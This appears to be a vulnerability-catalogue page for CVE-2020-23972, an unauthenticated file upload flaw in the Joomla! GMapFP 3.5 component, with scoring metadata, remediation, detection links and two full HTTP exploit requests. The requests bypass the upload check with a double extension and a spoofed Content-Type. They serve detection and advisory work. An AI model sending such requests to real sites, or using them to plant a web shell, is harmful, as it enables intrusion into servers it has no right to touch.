---
layout: post
cve_id: CVE-2020-23972
title: Joomla! Component GMapFP 3.5 - Arbitrary File Upload
pcap: true
pcap_path: /pcaps/2020/CVE-2020-23972.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2020/CVE-2020-23972.yaml
snort2_rule: N/A
snort3_rule: N/A
author: dwisiswant0
severity: high
impact: 'Successful exploitation of this vulnerability can result in unauthorized
  remote code execution on the affected Joomla! website.

  '
remediation: 'Apply the latest security patch or update to a patched version of Joomla!
  Component GMapFP 3.5 to mitigate this vulnerability.

  '
reference:
- https://www.exploit-db.com/exploits/49129
- https://raw.githubusercontent.com/me4yoursecurity/Reports/master/README.md
- http://packetstormsecurity.com/files/159072/Joomla-GMapFP-J3.5-J3.5F-Arbitrary-File-Upload.html
- https://nvd.nist.gov/vuln/detail/CVE-2020-23972
- https://github.com/ARPSyndicate/cvemon
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N
  cvss-score: 7.5
  cve-id: CVE-2020-23972
  cwe-id: CWE-434
  epss-score: 0.77029
  epss-percentile: 0.98917
  cpe: cpe:2.3:a:gmapfp:gmapfp:j3.5:*:*:*:-:joomla\!:*:*
metadata:
  max-request: 2
  vendor: gmapfp
  product: gmapfp
  framework: joomla\!
tags:
- cve2020
- cve
- joomla
- edb
- packetstorm
- fileupload
- intrusive
- gmapfp
- joomla\!
- vkev
- vuln
---

## üîç Vulnerability Description
Joomla! Component GMapFP 3.5 is vulnerable to arbitrary file upload vulnerabilities. An attacker can access the upload function of the application
without authentication and can upload files because of unrestricted file upload which can be bypassed by changing Content-Type & name file too double ext.


## üåê HTTP Request
```nohighlight
POST /index.php?option=comgmapfp&controller=editlieux&tmpl=component&task=upload_image HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:1.9.5.20) Gecko/ Firefox/3.6.16
Content-Length: 411
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarySHHbUsfCoxlX1bpS
Referer: http://www.victim.com
Accept-Encoding: gzip
------WebKitFormBoundarySHHbUsfCoxlX1bpS
Content-Disposition: form-data; name="option"
com_gmapfp
------WebKitFormBoundarySHHbUsfCoxlX1bpS
Content-Disposition: form-data; name="image1"; filename="tymww.html.gif"
Content-Type: text/html
projectdiscovery
------WebKitFormBoundarySHHbUsfCoxlX1bpS
Content-Disposition: form-data; name="no_html"
no_html
------WebKitFormBoundarySHHbUsfCoxlX1bpS--
```

```nohighlight
POST /index.php?option=com_gmapfp&controller=editlieux&tmpl=component&task=upload_image HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
Content-Length: 411
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarySHHbUsfCoxlX1bpS
Referer: http://www.victim.com
Accept-Encoding: gzip
------WebKitFormBoundarySHHbUsfCoxlX1bpS
Content-Disposition: form-data; name="option"
com_gmapfp
------WebKitFormBoundarySHHbUsfCoxlX1bpS
Content-Disposition: form-data; name="image1"; filename="tymww.html.gif"
Content-Type: text/html
projectdiscovery
------WebKitFormBoundarySHHbUsfCoxlX1bpS
Content-Disposition: form-data; name="no_html"
no_html
------WebKitFormBoundarySHHbUsfCoxlX1bpS--
```

